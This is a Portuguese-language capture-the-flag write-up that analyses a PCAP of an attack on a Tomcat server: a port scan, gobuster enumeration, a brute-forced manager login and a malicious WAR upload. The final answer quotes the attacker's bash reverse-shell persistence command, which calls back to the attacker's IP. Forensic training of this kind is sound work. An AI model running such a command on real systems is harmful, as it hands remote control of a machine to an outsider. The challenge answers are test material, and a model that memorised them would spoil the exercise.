#Category : Network Forensics #Difficult : Easy
***
#### Info
Recebemos um arquivo de tráfego de rede para prosseguir com as nossa investigações.
![[Pasted image 20250519175314.png]]
***
#### 1 - Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?
Podemos começar analisando pelas `Conversations Statistics`. E notar se há alguma variação de portas sobre o mesmo `IP`, o que indicaria uma varredura, pois se você sabe o serviço de um servidor, não é necessário ir testando as portas.
![[Pasted image 20250519175916.png]]

Nas conversas `TCP` temos uma variação de portas muito grande do servidor `10.0.0.112` de requisições vindas de  `14.0.0.120`.

**Answer :** `14.0.0.120`
***
#### 2 - Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?
Podemos usar uma `API` diretamente pelo terminal para termos algumas informações sobre esse `IP`.
![[Pasted image 20250519183755.png]]

**Answer :** `China`
***
#### 3 - From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?
Aqui filtrei pelo protocolo `HTTP` e pelo `IP` de origem sendo o `IP` do atacante. Após o filtro, só restaram as portas `80` mas ainda assim procurei pela rota do `Admin`.
![[Pasted image 20250519190926.png]]

**Answer :** `8080`
***
#### 4 - Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?
Aqui podemos olhar o `User-Agent` até encontrar algum que seja incomum de uma requisição normal.
![[Pasted image 20250519191236.png]]

**Answer :** `gobuster`
***
#### 5 - After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?
Filtrei por requisições enviadas pelo `Gobuster` pertencentes ao atacante e com resposta `200`.
![[Pasted image 20250519194518.png]]

Nas respostas `200` temos uma com a requisição de nome interessante, referente a um endpoint `manager`.

**Answer :** `/manager`
***
#### 6 - After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct username and password that the attacker successfully used for login?
De começo tentei filtrar por algum tipo de autenticação na página, como não achei, decidi filtrar pela autenticação do próprio `HTTP`.
![[Pasted image 20250519195059.png]]

Então segui o fluxo `HTTP` do último pacote, pois como foi o último, significa que após isso ele foi autenticado.
![[Pasted image 20250519195638.png]]

Então utilizo um decode `Base64` para obter o valor original.
![[Pasted image 20250519195714.png]]

**Answer :** `admin:tomcat`
***
#### 7 - Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?
Ainda nesse fluxo podemos obter o nome do arquivo que foi enviado.
![[Pasted image 20250519200024.png]]

**Answer :** `JXQOZY.war`
***
#### 8 - After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?
Nesse fluxo foi enviado o `payload`, no próximo `Stream` podemos ver os comando que o atacante enviou para a máquina através do payload.
![[Pasted image 20250519201251.png]]

E aqui temos mais conversas relacionadas ao payload.
![[Pasted image 20250519201327.png]]

**Answer :** `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`
***
![[Pasted image 20250519201358.png]]